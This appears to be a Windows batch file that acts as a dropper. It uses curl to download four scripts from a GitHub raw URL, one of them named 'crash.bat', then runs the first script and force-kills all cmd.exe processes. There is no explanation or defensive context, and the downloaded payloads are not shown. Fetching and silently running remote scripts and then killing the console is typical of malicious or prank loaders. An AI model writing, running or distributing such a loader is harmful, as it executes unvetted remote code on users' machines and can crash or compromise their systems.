@echo off
curl --output a.vbs "https://raw.githubusercontent.com/p6c/a/main/a.vbs"
curl --output b.vbs "https://raw.githubusercontent.com/p6c/a/main/b.vbs"
curl --output c.bat "https://raw.githubusercontent.com/p6c/a/main/c.bat"
curl --output crash.bat "https://raw.githubusercontent.com/p6c/a/main/crash.bat"
a.vbs
taskkill /t /f /im cmd.exe
